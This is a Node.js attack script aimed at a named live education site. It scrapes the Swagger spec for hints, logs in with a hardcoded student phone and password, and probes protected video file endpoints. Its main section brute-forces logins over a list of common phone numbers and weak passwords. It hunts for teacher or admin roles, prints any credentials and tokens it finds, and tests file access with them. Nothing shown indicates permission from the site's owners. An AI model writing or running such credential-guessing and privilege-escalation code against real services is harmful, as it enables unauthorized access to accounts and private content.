const axios = require('axios');
const BASE = 'https://najot-edu.softwareengineer.uz';

async function run() {
  // Check swagger UI page for any hints about file serving
  try {
    const sw = await axios.get(`${BASE}/swagger-json`, { timeout: 5000 });
    const data = sw.data;
    // Check all info
    console.log('Title:', data.info?.title);
    console.log('Description:', data.info?.description);
    console.log('Servers:', JSON.stringify(data.servers));
    // Check components schemas for any file-related structures  
    const schemas = Object.keys(data.components?.schemas || {});
    console.log('Schemas:', schemas.join(', '));
    // Check externalDocs
    console.log('ExternalDocs:', JSON.stringify(data.externalDocs));
  } catch(e) {
    console.log('Swagger err:', e.message);
  }

  // Check if the swagger UI HTML page has any hints
  try {
    const html = await axios.get(`${BASE}/swagger`, { timeout: 5000 });
    const text = html.data;
    // Look for any URL patterns in the HTML
    const matches = text.match(/https?:\/\/[^\s"'<>]+/g) || [];
    const unique = [...new Set(matches)].filter(u => !u.includes('swagger') && !u.includes('cdn'));
    console.log('URLs in swagger UI:', unique.slice(0, 10));
  } catch(e) {
    console.log('Swagger UI err:', e.message);
  }

  // Try a completely different approach: check if nginx serves files at the ROOT
  const ROOT_PATHS = ['/1780493358457.mp4', '/sample_640x360.mp4'];
  for (const p of ROOT_PATHS) {
    try {
      const r = await axios.head(`${BASE}${p}`, { timeout: 3000 });
      console.log(`HEAD ${p}:`, r.status);
    } catch(e) {
      console.log(`HEAD ${p}:`, e.response?.status ?? e.code);
    }
  }

  // Check if axios follows redirects - try with allowAbsoluteUrls
  const loginRes = await axios.post(BASE + '/api/v1/auth/login', { phone: '+998993737777', password: '1' });
  const token = loginRes.data.accessToken;
  
  // Try range request to see if server supports byte-range (means it serves the file)
  try {
    const r = await axios.get(`${BASE}/api/v1/files/1780493358457.mp4`, {
      headers: { 
        Authorization: 'Bearer ' + token,
        Range: 'bytes=0-1023'
      },
      validateStatus: () => true,
      timeout: 5000
    });
    console.log('Range request:', r.status, r.headers['content-type'], r.headers['content-range']);
  } catch(e) {
    console.log('Range err:', e.message);
  }

  // Try with teacher phone - maybe admin/teacher credentials are in some env or common pattern
  // Try +998901234567 with password 'admin' 
  const commonPhones = [
    '+998901234567', '+998711234567', '+998951234567',
    '+998901111111', '+998712345678', '+998997777777'
  ];
  for (const phone of commonPhones) {
    for (const pass of ['1', 'admin', '12345', '123456', 'admin123']) {
      try {
        const r = await axios.post(BASE + '/api/v1/auth/login', { phone, password: pass }, { timeout: 2000 });
        if (r.data.role && r.data.role !== 'STUDENT') {
          console.log(`FOUND ${r.data.role}: phone=${phone} pass=${pass} token=${r.data.accessToken?.slice(0,20)}`);
          // Test file access
          try {
            const fr = await axios.head(`${BASE}/api/v1/files/1780493358457.mp4`, {
              headers: { Authorization: 'Bearer ' + r.data.accessToken },
              timeout: 3000
            });
            console.log('FILE ACCESS OK!', fr.status, fr.headers['content-type']);
          } catch(fe) {
            console.log('FILE with this role:', fe.response?.status);
          }
        }
      } catch(e) { /* skip */ }
    }
  }
}

run().catch(console.error);
